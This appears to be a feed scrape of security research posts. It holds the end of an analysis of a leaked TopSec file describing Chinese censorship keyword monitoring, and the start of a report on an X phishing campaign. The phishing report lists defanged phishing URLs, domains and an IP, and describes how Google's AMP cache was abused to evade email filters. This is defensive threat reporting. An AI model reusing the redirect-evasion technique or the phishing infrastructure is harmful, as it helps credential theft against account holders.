<p>We identified this leak as a submission to a multi-scanner platform that fired off a rule that looks for common abuse activities associated with Kubernetes. The main file we analyzed (SHA-1: <code>1bccef07ad0348e326248fe321259e2bd8f8cf8b</code>) contains numerous work logs, which are a description of the work performed by a TopSec employee and the amount of time the task took, often accompanied by scripts, commands, or data related to the task.</p>
<figure id="attachment_114590" aria-describedby="caption-attachment-114590" style="width: 755px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_5.jpg" alt="Example of work logs from the file along with English translation" width="755" height="154" class="size-full wp-image-114590" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_5.jpg 755w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_5-300x61.jpg 300w" sizes="auto, (max-width: 755px) 100vw, 755px" /><figcaption id="caption-attachment-114590" class="wp-caption-text">Example of work logs from the file along with English translation</figcaption></figure>
<p>In addition to work logs, the leak contains many commands and playbooks used to administrate TopSec’s services via multiple common DevOps and infrastructure technologies that are used worldwide, including Ansible, Docker, ElasticSearch, Gitlab, Kafka, Kibana, Kubernetes, and Redis. There are many artifacts showing JSON data for web APIs used by TopSec services. There are also network configurations, SSH and port mapping commands with hardcoded credentials, which present a huge security risk should anyone obtain access to the environment–and would likely provide access to TopSec’s downstream customers as well.</p>
<figure id="attachment_114598" aria-describedby="caption-attachment-114598" style="width: 686px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_14.jpg" alt="Ansible commands from leaked file used to access infrastructure" width="686" height="190" class="size-full wp-image-114598" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_14.jpg 686w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_14-300x83.jpg 300w" sizes="auto, (max-width: 686px) 100vw, 686px" /><figcaption id="caption-attachment-114598" class="wp-caption-text">Ansible commands from leaked file used to access infrastructure</figcaption></figure>
<p>The leaked file is very large, disorganized, and the formatting is inconsistent, which complicates analysis. It is highly likely that we have not identified all capabilities outlined in the leak. Our analysis approach focused on translating the Chinese language content, identifying known technologies, and identifying interesting references in the commands and API JSON artifacts, particularly those where there were upticks in work logs performed around specific dates documented in the work logs or web API data.</p>
<p>The data leak includes a file that starts with infrastructure management code, including some which initializes several Docker images to enable security monitoring related features. These containers run probes, which are likely used for network monitoring. We are unable to fully assess the capabilities of these containers without access to them. However, the containers are run with several flags such as <code>--privileged</code> and <code>--net host</code> that suggest deep access to the monitored data. This may indicate the probes inspect network traffic or perform privileged tasks in the deployment environment.</p>
<p>Deeper in the file, there are work logs which contain dates indicating when certain tasks were performed and notes from the TopSec staff who worked on specific infrastructure projects. One project referenced repeatedly is called Sparta or Sparda, with the spelling changing regularly. Notes from the TopSec staff indicate that Sparta handles sensitive word processing, an indication of censorship keyword monitoring.</p>
<p>On a technical level, Sparta is a framework that uses GraphQL APIs to receive content from downstream web applications. Work logs indicate that TopSec migrated from a system called Apollo, which is plausibly a reference to <a href="https://github.com/apollographql">Apollo-GraphQL</a>, an open-source framework offered by a company based in San Francisco. The work logs also indicate that Sparta is equipped to process Chinese language characters. This suggests that TopSec likely developed Sparta as an in-house solution that is tailored to the localized needs of TopSec’s customers and does not rely on a US-based solution.</p>
<p>Additionally, we observed a note indicating that detection alerts considered severe are likely distributed to internal teams via WeChat for prioritized handling. WeChat is a widely-used messaging and social media platform in China, known for its broad range of features, including messaging, social networking, and payment services. Its integration into daily life makes it an essential tool for communication and business operations within the country.</p>
<pre>
Severe monitoring events are sent to corporate WeChat
</pre>
<p>Since WeChat operates under Chinese regulations, there are significant implications regarding data privacy and government access. Under Chinese laws, such as the <a href="https://digichina.stanford.edu/work/translation-cybersecurity-law-of-the-peoples-republic-of-china-effective-june-1-2017/">Cybersecurity Law</a>, companies like Tencent, which owns WeChat, are required to cooperate with government entities, allowing them to access data when requested.</p>
<h2>Web Content Monitoring</h2>
<p>Our analysis found that TopSec’s capabilities include web content monitoring, as indicated by references to a service called <code>Website Monitoring Service</code> and detection events with internal identifiers prefixed with <code>Web</code>, such as <code>WebTamper</code>, <code>WebHiddenLink</code>, <code>WebAvailHttp</code>, <code>WebDns</code>, <code>WebTr</code>, and <code>WebSensitive</code>.</p>
<p>This feature of the platform is likely part of what would have been proposed in response to the bid issued by the Shanghai Pudong Bureau for the &#8220;Cloud Monitoring Service Project&#8221;, offering the Bureau tools to monitor website security and content as part of their broader surveillance and compliance efforts.</p>
<pre>
Inspect website monitoring-related services
[ . . . ]
[2024-06-12T18:00:00 to 2024-06-12T22:00:00 Event volume: 553] 2024-06-12T18:00:00 to 2024-06-12T22:00:00 Event volume: 553
WebSensitive 56
WebTamper 149
WebHiddenLink 348
</pre>
<p>While the exact logic behind how the Web events are triggered remains unclear, the event names and metadata present in the documents provide insight into the purpose of some of these events. For instance, the <code>WebAvailHttp</code> event is likely triggered when a website is considered unavailable due to its response time (measured in milliseconds as <code>respTimeMs</code> in the figure below) exceeding a predefined threshold (<code>respThresholdMs</code>).</p>
<figure id="attachment_114595" aria-describedby="caption-attachment-114595" style="width: 330px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_17.jpg" alt="Metadata on the WebAvailHttp event" width="330" height="357" class="size-full wp-image-114595" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_17.jpg 330w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_17-277x300.jpg 277w" sizes="auto, (max-width: 330px) 100vw, 330px" /><figcaption id="caption-attachment-114595" class="wp-caption-text">Metadata on the <em>WebAvailHttp</em> event</figcaption></figure>
<p>Further, the <code>WebHiddenLink</code> event is likely triggered when web content contains hidden links — links that obscure their destination or mislead users, posing a security risk. Examples include links concealed within small or transparent elements, deceptive anchor text, and styling tricks that make links appear as plain text.</p>
<figure id="attachment_114601" aria-describedby="caption-attachment-114601" style="width: 423px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_11.jpg" alt="The WebHiddenLink event" width="423" height="92" class="size-full wp-image-114601" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_11.jpg 423w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_11-300x65.jpg 300w" sizes="auto, (max-width: 423px) 100vw, 423px" /><figcaption id="caption-attachment-114601" class="wp-caption-text">The <em>WebHiddenLink</em> event</figcaption></figure>
<h3>Web Content Monitoring | Sensitive Words</h3>
<p>The <code>WebSensitive</code> event is likely triggered when web content contains so-called <a href="https://www.sciencedirect.com/science/article/abs/pii/S2211695822000897">sensitive words</a> (敏感词 in Simplified Chinese). These words are related to political criticism, violence, or pornography, and are central to China&#8217;s domestic Internet censorship efforts aimed at ensuring compliance with government policies. Detecting the presence of such words in web content helps prevent the dissemination of information considered inappropriate or harmful by PRC authorities.</p>
<pre>
Assist the product to check for missed scans and manual analysis and marking errors of sensitive word events
</pre>
<p>TopSec’s ability to detect sensitive words demonstrates the impact that state policies related to the cyber domain have on the design and implementation of monitoring solutions developed by the private sector in China. These policies shape the strategies and technologies used to monitor, filter, and control online content, ensuring that IT systems comply with governmental regulations and censorship guidelines.</p>
<p><code>WebSensitive</code> alerts may be used by private sector organizations to monitor user-generated content on their websites in order to trigger actions such as issuing warnings, deleting content, or restricting access when sensitive words are detected. Government entities may also consume these alerts to track the presence of sensitive words on their own websites or across broader online spaces to enforce compliance with national censorship regulations. For example, the latter may have been an objective of the previously mentioned &#8220;Cloud Monitoring Service Project&#8221; by the Shanghai Pudong Bureau of the Ministry of Public Security.</p>
<p>We observed a task list indicating a focused effort to ensure consistent monitoring for sensitive words between 7:00 AM and 8:00 AM on the 14th (converted from GMT to China Standard Time), with the month and year not specified. The preceding document content suggests that the reference is to September 2023. One item in the task list instructs verification of the availability and capacity of sensitive word detection capabilities during this period, while another item records the forwarding of &#8216;asset identifiers&#8217; for collected &#8216;validated events&#8217; to an individual named Zhao Nannan (赵楠楠). The task list issuing this instruction very likely includes a typo stating the validated events were from 7:00 AM to 10:00 PM on September 14.</p>
<pre>
1. 	Plan the probe deployment plan for the web split emergency milestone launch 3h
2. 	Check the number of agents for sensitive words between 23:00 on the 13th (GMT) and 14:00 at 00:00 (排查敏感词13日23点到14点0点之间的代办数量) 2h
3. 	Check cloud baseline 500 errors 1h
4. 	Collect asset identifiers of valid events on the 13th and provide them to Zhao Nannan 1h
5. 	Check the task execution failure of ipv6 probe 1h
</pre>
<figure id="attachment_114594" aria-describedby="caption-attachment-114594" style="width: 379px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_18.jpg" alt="Document excerpts indicating sensitive web content actions in September 2023" width="379" height="276" class="size-full wp-image-114594" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_18.jpg 379w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_18-300x218.jpg 300w" sizes="auto, (max-width: 379px) 100vw, 379px" /><figcaption id="caption-attachment-114594" class="wp-caption-text">Document excerpts indicating sensitive web content actions in September 2023</figcaption></figure>
<p>The identification of an individual named Zhao Nannan as the likely recipient of this information, alongside the context of the monitoring effort, leads us to conclude with moderate confidence that this effort was in response to political events in Shanghai.</p>
<p>We identified a woman named Zhao Nannan as having worked at the 3rd Bureau of the Ministry of Public Security in Shanghai, which is <a href="https://web.archive.org/web/20240622033538/https://www.trimps.ac.cn/gass/index.html">responsible</a> for network security and technical investigations. Our observations presented earlier in this post suggest close ties between Shanghai-based Bureaus of the Ministry of Public Security and TopSec, one example being TopSec&#8217;s participation in a project bidding process launched by the Shanghai Pudong Bureau.</p>
<p><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_16.jpg" alt="" width="1442" height="328" class="aligncenter size-full wp-image-114596" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_16.jpg 1442w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_16-300x68.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_16-1024x233.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_16-768x175.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_16-221x51.jpg 221w" sizes="auto, (max-width: 1442px) 100vw, 1442px" /><br />
<figure id="attachment_114593" aria-describedby="caption-attachment-114593" style="width: 1388px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_2.jpg" alt="Employment affiliation of Zhao Nannan" width="1388" height="376" class="size-full wp-image-114593" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_2.jpg 1388w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_2-300x81.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_2-1024x277.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_2-768x208.jpg 768w" sizes="auto, (max-width: 1388px) 100vw, 1388px" /><figcaption id="caption-attachment-114593" class="wp-caption-text">Employment affiliation of Zhao Nannan (Source: LinkedIn)</figcaption></figure></p>
<p>However, Zhao Nannan no longer works for the MPS 3rd Bureau in Shanghai. According to an online announcement from the Shanghai State-owned Assets Supervision and Administration Commission (SASAC), Zhao Nannan was one of six successful applicants to SASAC for a network security role. The announcement even references her past role at the MPS 3rd Bureau. Congratulations are due to her, as she scored the highest among the applicants for the role–恭喜!</p>
<p><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_15.jpg" alt="" width="1999" height="624" class="aligncenter size-full wp-image-114597" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_15.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_15-300x94.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_15-1024x320.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_15-768x240.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_15-1536x479.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><br />
<figure id="attachment_114589" aria-describedby="caption-attachment-114589" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_6.jpg" alt="Zhao Nannan’s role at Shanghai SASAC" width="1999" height="624" class="size-full wp-image-114589" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_6.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_6-300x94.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_6-1024x320.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_6-768x240.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_6-1536x479.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-114589" class="wp-caption-text">Zhao Nannan’s role at Shanghai SASA (<a href="https://perma.cc/65UL-57DP" target="_blank">Source</a>)</figcaption></figure></p>
<p>On the morning of September 14th, when Zhao Nannan received alerts for sensitive content, her new employer announced on its WeChat account that the head of the Shanghai SASAC, Bai Tinghui, was under investigation for corruption. The news was quickly picked up by the South China Morning Post, Caixing, and other news-reposting blogs in China. The Shanghai government itself confirmed the investigation into Bai Tinghui and his subsequent dismissal one month later.</p>
<figure id="attachment_114592" aria-describedby="caption-attachment-114592" style="width: 1890px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_3.jpg" alt="News coverage on Bai Tinghui&#039;s investigation" width="1890" height="808" class="size-full wp-image-114592" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_3.jpg 1890w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_3-300x128.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_3-1024x438.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_3-768x328.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_3-1536x657.jpg 1536w" sizes="auto, (max-width: 1890px) 100vw, 1890px" /><figcaption id="caption-attachment-114592" class="wp-caption-text">News coverage on Bai Tinghui&#8217;s investigation (<a href="https://www.scmp.com/news/china/politics/article/3234543/chinas-corruption-crackdown-puts-5-soes-and-shanghai-state-assets-supervisor-investigation-cross" target="_blank">Source</a>)</figcaption></figure>
<figure id="attachment_114602" aria-describedby="caption-attachment-114602" style="width: 1536px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_10.jpg" alt="Government confirmation of Bai Tinghui&#039;s dismissal" width="1536" height="1116" class="size-full wp-image-114602" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_10.jpg 1536w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_10-300x218.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_10-1024x744.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_10-768x558.jpg 768w" sizes="auto, (max-width: 1536px) 100vw, 1536px" /><figcaption id="caption-attachment-114602" class="wp-caption-text">Government confirmation of Bai Tinghui&#8217;s dismissal (<a href="https://www.shanghai.gov.cn/rsrm2023/20231023/a04677676dd443fd8c38c2a462758ccd.html" target="_blank">Source</a>)</figcaption></figure>
<p>Because the Shanghai SASAC posted the news on WeChat, we know that the investigation itself was not subject to censorship. The lack of complete censorship regarding the investigation raises questions about what “validated events” would have been reported to Zhao Nannan following the announcement.</p>
<p>Currently, only five webpages of the Shanghai SASAC still mention Bai Tinghui. All five pages also mention Bai leading a Party study session of Xi Jinping Thought. It’s unclear why only these pages of Bai Tinghui remain–perhaps his tarnished reputation is outshown by Xi Jinping: it may be hard to delete a website with Xi Jinping’s name on it, even if it is accompanied by a corrupt local official.</p>
<figure id="attachment_114599" aria-describedby="caption-attachment-114599" style="width: 1088px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_13.jpg" alt="Search results that still show Bai Tinghui’s name on SASAC website" width="1088" height="1778" class="size-full wp-image-114599" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_13.jpg 1088w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_13-184x300.jpg 184w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_13-627x1024.jpg 627w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_13-768x1255.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_13-940x1536.jpg 940w" sizes="auto, (max-width: 1088px) 100vw, 1088px" /><figcaption id="caption-attachment-114599" class="wp-caption-text">Search results that still show Bai Tinghui’s name on SASAC website</figcaption></figure>
<p>Intriguingly, the organization that is responsible for investigating the fallen Bai Tinghui, the Shanghai Municipal Commission for Discipline Inspection, is listed among TopSec’s customers in the tooling.</p>
<p>The downfall of Bai Tinghui and the resulting use of Beijing TopSec’s tooling for coordinated monitoring of politically sensitive content shines a light on the important role cybersecurity companies can play in Chinese politics. The CCP has <a href="https://www.newamerica.org/cybersecurity-initiative/blog/chinas-strategic-thinking-building-power-cyberspace/">long-acknowledged</a> that “If our party cannot traverse the hurdle represented by the Internet, it cannot traverse the hurdle of remaining in power for the long term.” This episode provides a compelling example of how corruption investigations expand to rely on the institutions of those being investigated and the cybersecurity companies that service them.</p>
<h2>Conclusion</h2>
<p>These leaks yield insight into the complex ecosystem of relationships between government entities and China’s private sector cybersecurity companies. While many countries have significant overlap between government requirements and private sector cybersecurity firms, the ties between these entities in China are much deeper and represent the state’s grasp on managing public opinion through online enforcement.</p>
<p>The September 2023 situation in Shanghai provides insight into how local and national government interests are enforced through private sector partnerships. The CCP’s strategy of controlling information is multifaceted and requires significant investment in resources that enable the monitoring and alteration of content that citizens engage with. While there are still many unknown factors regarding how such censorship is applied, these findings yield insights into how collaboration occurs between the government and other entities in China.</p>
<p>The nature of how this data was leaked remains unclear, but the materials show that TopSec engineers were documenting their work in a highly granular way that included entire commands used to perform the outlined tasks. Considering the types of information in this leak, organizations should evaluate how their systems and infrastructure engineers are logging work. Proper credential management is essential to securing sensitive environments. Infrastructure engineers should rely on a secrets manager that integrates with the CI/CD pipeline rather than running commands from playbooks that include hardcoded credentials. This results in only variable names being stored in commands instead of sensitive credentials and lowers the likelihood that an unexpected disclosure could result in further compromise.</p>
]]></content:encoded>
					
		
		
		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/CasS-Leaks-ftr.jpg" length="604370" type="image/jpeg" />	</item>
		<item>
		<title>X Phishing &#124; Campaign Targeting High Profile Accounts Returns, Promoting Crypto Scams</title>
		<link>https://www.sentinelone.com/labs/phishing-on-x-high-profile-account-targeting-campaign-returns/</link>
		
		<dc:creator><![CDATA[Tom Hegel, Jim Walter &amp; Alex Delamotte]]></dc:creator>
		<pubDate>Fri, 31 Jan 2025 14:55:46 +0000</pubDate>
				<category><![CDATA[cryptocurrency]]></category>
		<category><![CDATA[phishing]]></category>
		<category><![CDATA[Scam]]></category>
		<category><![CDATA[twitter]]></category>
		<category><![CDATA[x]]></category>
		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=113618</guid>

					<description><![CDATA[SentinelLABS has observed an active phishing campaign targeting high-profile X accounts to hijack and exploit them for fraudulent activity.]]></description>
										<content:encoded><![CDATA[<h2>Executive Summary</h2>
<ul>
<li>An active phishing campaign is targeting high-profile X accounts in an attempt to hijack and exploit them for fraudulent activity.</li>
<li>This campaign has been observed targeting a variety of individual and organization accounts such as U.S. political figures, leading international journalists, an X employee, large technology organizations, cryptocurrency organizations, and owners of valuable, short usernames.</li>
<li>SentinelLABS’ analysis links this activity to a similar operation from last year that successfully compromised multiple accounts to spread scam content with financial objectives. While the activity detailed here is centered around X/Twitter accounts, this actor is not limited to a single social platform, and can be observed directing attention to other popular services as well, while seemingly pursuing the same financial objectives.</li>
</ul>
<p>If you’ve encountered similar suspicious activity, SentinelLABS would love to hear from you — please reach out to the team at <a href="mailto:ThreatTips@sentinelone.com" target="_blank" rel="noopener noreferrer">ThreatTips@sentinelone.com</a>.</p>
<h2>Account Compromise Process</h2>
<p>Thanks to tips from targets and collaboration with industry partners, SentinelLABS has observed a variety of phishing lures tied to this campaign over the past few weeks. One example is the classic account login notice. The links in the email received by the target are not legitimate and lead to credential phishing sites. Other observed lures use copyright violation themes. However, SentinelLABS notes that directly phishing users may not be the only access method employed by this attacker.</p>
<figure id="attachment_113633" aria-describedby="caption-attachment-113633" style="width: 760px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="wp-image-113633 size-full" src="https://www.sentinelone.com/wp-content/uploads/2025/01/new-login-phishing-email.jpg" alt="" width="760" height="1320" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/new-login-phishing-email.jpg 760w, https://www.sentinelone.com/wp-content/uploads/2025/01/new-login-phishing-email-173x300.jpg 173w, https://www.sentinelone.com/wp-content/uploads/2025/01/new-login-phishing-email-590x1024.jpg 590w" sizes="auto, (max-width: 760px) 100vw, 760px" /><figcaption id="caption-attachment-113633" class="wp-caption-text">An X ‘new login’-themed phishing email</figcaption></figure>
<p>In recent cases, we observed the actor abusing Google&#8217;s &#8220;AMP Cache&#8221; domain <code>cdn.ampproject[.]org</code> to evade email detections and redirect the user to a phishing domain:</p>
<pre>https://cdn.ampproject[.]org/c/s/x-recoverysupport.com/reset/?username=[X-USERNAME]</pre>
<p>This ultimately leads the targets to an actor-made phishing website seeking X account credentials:</p>
<figure id="attachment_113632" aria-describedby="caption-attachment-113632" style="width: 684px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="wp-image-113632 size-full" src="https://www.sentinelone.com/wp-content/uploads/2025/01/x-creds-phishing-page.jpg" alt="" width="684" height="792" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/x-creds-phishing-page.jpg 684w, https://www.sentinelone.com/wp-content/uploads/2025/01/x-creds-phishing-page-259x300.jpg 259w" sizes="auto, (max-width: 684px) 100vw, 684px" /><figcaption id="caption-attachment-113632" class="wp-caption-text">X credential phishing page</figcaption></figure>
<p>In the copyright infringement lure scenario, the user will first visit an Action Needed page before being prompted to enter credentials:</p>
<figure id="attachment_113631" aria-describedby="caption-attachment-113631" style="width: 1514px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="size-full wp-image-113631" src="https://www.sentinelone.com/wp-content/uploads/2025/01/x-fake-copyright-infringement.jpg" alt="" width="1514" height="786" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/x-fake-copyright-infringement.jpg 1514w, https://www.sentinelone.com/wp-content/uploads/2025/01/x-fake-copyright-infringement-300x156.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/01/x-fake-copyright-infringement-1024x532.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/01/x-fake-copyright-infringement-768x399.jpg 768w" sizes="auto, (max-width: 1514px) 100vw, 1514px" /><figcaption id="caption-attachment-113631" class="wp-caption-text">X fake copyright infringement page</figcaption></figure>
<p>Once an account is taken over, the attacker swiftly locks out the legitimate owner and begins posting fraudulent cryptocurrency opportunities or links to external sites designed to lure additional targets, often with a crypto theft-related theme. Ultimately, compromising high-profile accounts enables the attacker to reach a broader audience of potential secondary victims, maximizing their financial gains.</p>
<h2>Widespread Activity</h2>
<p>In recent activity associated with this campaign, the domain <code>securelogins-x[.]com</code> has been used to deliver emails and <code>x-recoverysupport[.]com</code> to host phishing pages. Our observations indicate a level of informality and flexibility of infrastructure use – meaning any of these domains can be considered email delivery or phishing page hosting.</p>
<p>An overall collection of recent activity can be observed hosted on <code>84.38.130[.]20</code>, an IP associated with a Belize-based VPS service called Dataclub. The domains themselves have been predominantly registered through Turkish hosting provider Turkticaret.</p>
<p>Inspecting the DNS history of <code>84.38.130[.]20</code> leads to a variety of interestingly related domains. As shown below, the cluster of activity began in mid-2024 and continues today. While this is only one phishing page hosting IP, it provides a good perspective of the length of this activity and its ability to avoid much attention for over a year.</p>
<figure id="attachment_113630" aria-describedby="caption-attachment-113630" style="width: 1558px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="size-full wp-image-113630" src="https://www.sentinelone.com/wp-content/uploads/2025/01/validin-infrastructure-analysis.jpg" alt="" width="1558" height="886" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/validin-infrastructure-analysis.jpg 1558w, https://www.sentinelone.com/wp-content/uploads/2025/01/validin-infrastructure-analysis-300x171.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/01/validin-infrastructure-analysis-1024x582.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/01/validin-infrastructure-analysis-768x437.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/01/validin-infrastructure-analysis-1536x873.jpg 1536w" sizes="auto, (max-width: 1558px) 100vw, 1558px" /><figcaption id="caption-attachment-113630" class="wp-caption-text">Validin Infrastructure Analysis Timeline</figcaption></figure>
<p>Our observations suggest that the attacker is highly adaptable, continuously exploring new techniques while maintaining a clear financial motive. The targeting appears constrained, yet opportunistic. Notably, past public reports have attributed related activity to Turkish-speaking actors based on language phishing page source comment language. At this time, we do not attribute this campaign to a specific country or any widely-tracked threat actor.</p>
<p>Some of the malicious sites and content hosted across <code>84.38.130[.]20</code> are built using the FASTPANEL DIRECT service.</p>
<figure id="attachment_113629" aria-describedby="caption-attachment-113629" style="width: 1046px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="size-full wp-image-113629" src="https://www.sentinelone.com/wp-content/uploads/2025/01/FASTPANEL-landing-page.jpg" alt="" width="1046" height="836" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/FASTPANEL-landing-page.jpg 1046w, https://www.sentinelone.com/wp-content/uploads/2025/01/FASTPANEL-landing-page-300x240.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/01/FASTPANEL-landing-page-1024x818.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/01/FASTPANEL-landing-page-768x614.jpg 768w" sizes="auto, (max-width: 1046px) 100vw, 1046px" /><figcaption id="caption-attachment-113629" class="wp-caption-text">FASTPANEL landing page on buy-tanai[.]com</figcaption></figure>
<p>FASTPANEL is a website hosting and building service that specializes in rapid building and management of websites. While FASTPANEL is not a malicious service, it is frequently abused by bad actors due to the ease of use, rapid scalability, and relatively low cost. FASTPANEL is routinely utilized by drainer gains and phishing campaigns, and is also included in associated guides and tutorials distributed throughout cybercrime communication channels.</p>
<figure id="attachment_113628" aria-describedby="caption-attachment-113628" style="width: 1556px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="size-full wp-image-113628" src="https://www.sentinelone.com/wp-content/uploads/2025/01/example-discussion-FASTPANEL.jpg" alt="" width="1556" height="664" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/example-discussion-FASTPANEL.jpg 1556w, https://www.sentinelone.com/wp-content/uploads/2025/01/example-discussion-FASTPANEL-300x128.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/01/example-discussion-FASTPANEL-1024x437.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/01/example-discussion-FASTPANEL-768x328.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/01/example-discussion-FASTPANEL-1536x655.jpg 1536w" sizes="auto, (max-width: 1556px) 100vw, 1556px" /><figcaption id="caption-attachment-113628" class="wp-caption-text">Example discussion of FASTPANEL (RU crime forum)</figcaption></figure>
<p>Of the sites hosted on <code>84.38.130[.]20</code>, the <code>buy-tanai[.]com</code> and <code>emotionai[.]live</code> sites still present the FASTPANEL landing pages as of this writing.</p>
<h2>Publicly Linkable Activity</h2>
<h3>Emerging Account Intrusions</h3>
<p>While we have not yet established a high-confidence link, a recent compromise of a Tor Project account closely mirrors our observations. On January 30, 2025, the official X account for the Tor Project was breached. While it is possible that the same threat actor is responsible, we lack sufficient evidence to confirm the connection as of this writing.</p>
<figure id="attachment_113627" aria-describedby="caption-attachment-113627" style="width: 1534px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="size-full wp-image-113627" src="https://www.sentinelone.com/wp-content/uploads/2025/01/x-tor-project-potential-comp.jpg" alt="" width="1534" height="1018" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/x-tor-project-potential-comp.jpg 1534w, https://www.sentinelone.com/wp-content/uploads/2025/01/x-tor-project-potential-comp-300x199.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/01/x-tor-project-potential-comp-1024x680.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/01/x-tor-project-potential-comp-768x510.jpg 768w" sizes="auto, (max-width: 1534px) 100vw, 1534px" /><figcaption id="caption-attachment-113627" class="wp-caption-text">X post from The Tor Project account on January 30, 2025 advising users of a potential compromise</figcaption></figure>
